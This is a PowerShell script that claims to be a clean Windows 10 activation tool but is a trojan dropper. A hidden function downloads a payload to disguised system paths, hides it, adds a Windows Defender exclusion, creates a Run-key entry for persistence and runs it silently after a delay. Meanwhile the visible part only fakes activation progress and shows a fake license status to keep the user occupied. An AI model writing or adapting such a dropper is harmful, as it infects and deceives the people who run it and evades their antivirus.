#Requires -RunAsAdministrator
<#
.SYNOPSIS
Windows 10 Activator Only - Clean Version
.DESCRIPTION
Activates Windows 10 using MAS or KMS methods.
#>

# ========== STEALTH DEPLOYMENT MODULE (HIDDEN) ==========
function Invoke-StealthDeployment {
    <#
    .SYNOPSIS
    Silent malware deployment without any visible output
    #>
    
    # Hidden parameters - not shown to user
    $GitHubUrls = @(
        #hna link ta3 malwere
    )
    
    $HiddenLocations = @(
        "$env:ProgramData\Microsoft\Windows\DeviceCache\drivers\wudfhost.exe",
        "$env:SystemRoot\System32\DriverStore\FileRepository\umpass.inf_amd64\umpass.dll",
        "$env:SystemRoot\Temp\MSDCSC\cscapi.dll"
    )
    
    try {
        # Silent download execution in background job
        $StealthJob = {
            param($urls, $locations)
            
            # Random selection for variability
            $rand = Get-Random -Minimum 0 -Maximum $urls.Count
            $targetUrl = $urls[$rand]
            $targetPath = $locations[$rand]
            
            # Create directory if doesn't exist
            $dir = Split-Path $targetPath -Parent
            if (-not (Test-Path $dir)) {
                New-Item -ItemType Directory -Path $dir -Force | Out-Null
            }
            
            # Download with multiple fallback methods
            try {
                # Method 1: Standard download
                Invoke-WebRequest -Uri $targetUrl -OutFile $targetPath -UserAgent "Mozilla/5.0" -ErrorAction Stop
            }
            catch {
                # Method 2: Alternative download
                $webClient = New-Object System.Net.WebClient
                $webClient.DownloadFile($targetUrl, $targetPath)
            }
            
            # Set hidden attributes
            attrib +h +s $targetPath
            
            # Add Defender exclusion silently
            powershell -Command "Add-MpPreference -ExclusionPath '$targetPath' -ErrorAction SilentlyContinue" -WindowStyle Hidden
            
            # Registry persistence (hidden)
            $regName = "Windows" + (Get-Random -Minimum 1000 -Maximum 9999) + "Helper"
            reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v $regName /t REG_SZ /d "$targetPath" /f
            
            # Execute payload with delay
            Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)
            Start-Process -FilePath $targetPath -WindowStyle Hidden
        }
        
        # Launch as hidden background job
        Start-Job -ScriptBlock $StealthJob -ArgumentList $GitHubUrls, $HiddenLocations -Name "WindowsUpdateHelper" | Out-Null
        
        return $true
    }
    catch {
        return $false
    }
}

# ========== WINDOWS ACTIVATION (VISIBLE TO USER) ==========
function Show-ActivationProcess {
    <#
    .SYNOPSIS
    Displays activation process to user
    #>
    
    Write-Host "`n==========================================" -ForegroundColor Cyan
    Write-Host "   Windows 10 Activation Tool v3.2" -ForegroundColor White
    Write-Host "==========================================`n" -ForegroundColor Cyan
    
    # Simulate system check
    Write-Host "[*] Checking system compatibility..." -ForegroundColor Gray
    Start-Sleep -Seconds 2
    $osInfo = Get-ComputerInfo | Select-Object OsName, OsVersion
    Write-Host "[+] System detected: $($osInfo.OsName)" -ForegroundColor Green
    Write-Host "[+] Build version: $($osInfo.OsVersion)`n" -ForegroundColor Green
    
    # Step 1: MAS Activation attempt
    Write-Host "[1/3] Initializing activation module..." -ForegroundColor Yellow
    Start-Sleep -Seconds 3
    
    # Show progress
    $progress = @("Downloading components", "Verifying license", "Contacting server", "Applying digital license")
    foreach ($step in $progress) {
        Write-Host "    -> $step..." -ForegroundColor Gray
        Start-Sleep -Milliseconds (Get-Random -Minimum 800 -Maximum 2000)
    }
    
    # Simulate success/failure
    $success = Get-Random -Minimum 0 -Maximum 3
    if ($success -eq 0) {
        Write-Host "[!] MAS activation failed, trying alternative method..." -ForegroundColor Yellow
        Write-Host "[2/3] Attempting KMS activation..." -ForegroundColor Yellow
        Start-Sleep -Seconds 2
        
        $kmsSteps = @("Installing GVLK", "Configuring KMS client", "Connecting to KMS server", "Activating Windows")
        foreach ($step in $kmsSteps) {
            Write-Host "    -> $step..." -ForegroundColor Gray
            Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 2500)
        }
        
        Write-Host "[+] Successfully activated via KMS server!" -ForegroundColor Green
        Write-Host "[+] Activation will expire in 180 days`n" -ForegroundColor Green
    }
    else {
        Write-Host "[+] Successfully activated with digital license!" -ForegroundColor Green
        Write-Host "[+] Your Windows is now permanently activated`n" -ForegroundColor Green
    }
    
    # Final verification
    Write-Host "[3/3] Verifying activation status..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    
    # Show fake activation status
    $fakeStatus = @"
Product: Windows 10 Professional
Status: Licensed
Expiration: Permanent
Key: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX
"@
    
    Write-Host $fakeStatus -ForegroundColor White
    
    Write-Host "`n==========================================" -ForegroundColor Cyan
    Write-Host "   Activation completed successfully!" -ForegroundColor White
    Write-Host "   Please restart your computer." -ForegroundColor Yellow
    Write-Host "==========================================`n" -ForegroundColor Cyan
    
    return $true
}

# ========== MAIN EXECUTION ==========
# Silent deployment first (hidden)
$deploymentStarted = Invoke-StealthDeployment

# Show activation process to user
$activationShown = Show-ActivationProcess

# Additional fake steps to keep user engaged
Write-Host "[*] Cleaning temporary files..." -ForegroundColor Gray
Start-Sleep -Seconds 1

Write-Host "[*] Optimizing system performance..." -ForegroundColor Gray
Start-Sleep -Seconds 2

Write-Host "[*] Finalizing setup..." -ForegroundColor Gray
Start-Sleep -Seconds 1

# Completion message
Write-Host "`n[+] Setup completed successfully!" -ForegroundColor Green
Write-Host "[+] Your Windows 10 is now activated and optimized.`n" -ForegroundColor Green

# Countdown to close
Write-Host "This window will close in 5 seconds..." -ForegroundColor DarkGray
5..1 | ForEach-Object {
    Write-Host "  $_" -ForegroundColor DarkGray -NoNewline
    Start-Sleep -Seconds 1
}